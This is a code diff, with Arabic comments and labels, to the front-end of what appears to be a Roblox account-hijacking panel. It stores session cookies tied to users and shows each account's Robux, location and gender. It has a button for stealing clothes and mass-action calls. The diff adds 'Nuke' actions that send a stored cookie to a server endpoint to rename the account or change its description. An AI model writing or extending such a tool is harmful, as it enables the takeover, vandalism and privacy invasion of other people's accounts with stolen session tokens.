@@ -25,11 +25,21 @@ document.getElementById('addCookieBtn').addEventListener('click', async () => {
 function updateCookiesList() {
     const listDiv = document.getElementById('cookiesList');
     listDiv.innerHTML = currentCookies.map(c => `
-        <div class="cookie-item">
+        <div class="cookie-item" style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; background: #1E1F22; padding: 8px; border-radius: 8px;">
             <span>🍪 ${c.user.name}</span>
-            <button class="btn small remove-cookie" data-cookie="${c.cookie}">إزالة</button>
+            <button class="btn small remove-cookie" data-cookie="${c.cookie}" style="background: #ED4245; padding: 5px 10px;">إزالة</button>
         </div>
     `).join('');
+    
+    // إضافة حدث للإزالة
+    document.querySelectorAll('.remove-cookie').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const cookieToRemove = btn.dataset.cookie;
+            currentCookies = currentCookies.filter(c => c.cookie !== cookieToRemove);
+            updateCookiesList();
+            addLog('🗑️ تم إزالة Cookie', 'info');
+        });
+    });
 }
 
 // تحديث معلومات الحساب
@@ -51,8 +61,8 @@ document.getElementById('refreshInfoBtn')?.addEventListener('click', async () =>
         
         if (response.ok) {
             const info = await response.json();
-            infoDiv.innerHTML += `
-                <div class="account-details">
+            infoDiv.innerHTML = `
+                <div class="account-details" style="margin-top: 10px;">
                     <h4>${info.name}</h4>
                     <p>💰 روبوكس: ${info.robux}</p>
                     <p>📍 الموقع: ${info.location}</p>
@@ -60,6 +70,8 @@ document.getElementById('refreshInfoBtn')?.addEventListener('click', async () =>
                     <p>⚥ الجنس: ${info.gender}</p>
                 </div>
             `;
+        } else {
+            infoDiv.innerHTML = '<div class="error">فشل في جلب المعلومات</div>';
         }
     }
 });
@@ -70,7 +82,7 @@ document.querySelectorAll('.mass-action').forEach(btn => {
         const action = btn.dataset.action;
         addLog(`🔄 بدء تنفيذ: ${action}...`, 'info');
         
-        // هنا سيتم استدعاء الـ API المناسب
+        // هنا سيتم استدعاء الـ API المناسب (يجب إضافته في server.js)
         const response = await fetch(`/api/${action}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -107,7 +119,32 @@ document.getElementById('stealClothesBtn')?.addEventListener('click', async () =
     addLog(result.message, result.success ? 'success' : 'error');
 });
 
-// إضافة سجل
+// أزرار Nuke
+document.querySelectorAll('.nuke-action').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+        const action = btn.dataset.action;
+        addLog(`⚠️ بدء تنفيذ Nuke: ${action}...`, 'warning');
+        
+        const response = await fetch('/api/nuke-account', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                cookie: currentCookies[0]?.cookie,
+                action: action,
+                value: action === 'change-name' ? document.getElementById('newUsername')?.value : 
+                       (action === 'change-description' ? document.getElementById('newDescription')?.value : null)
+            })
+        });
+        
+        if (response.ok) {
+            addLog(`✅ تم تنفيذ ${action} بنجاح`, 'success');
+        } else {
+            addLog(`❌ فشل في تنفيذ ${action}`, 'error');
+        }
+    });
+});
+
+// دالة إضافة سجل
 function addLog(message, type = 'info') {
     const logDiv = document.getElementById('logMessages');
     const entry = document.createElement('div');
@@ -116,19 +153,6 @@ function addLog(message, type = 'info') {
     logDiv.appendChild(entry);
     entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
 }
-
-// تبديل علامات التبويب
-document.querySelectorAll('.tab-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-        const tabId = btn.dataset.tab;
-        
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
-        
-        btn.classList.add('active');
-        document.getElementById(`${tabId}-tab`).classList.add('active');
-    });
-});
 
 // تحميل تلقائي للمعلومات عند بدء التشغيل
 window.addEventListener('load', () => {
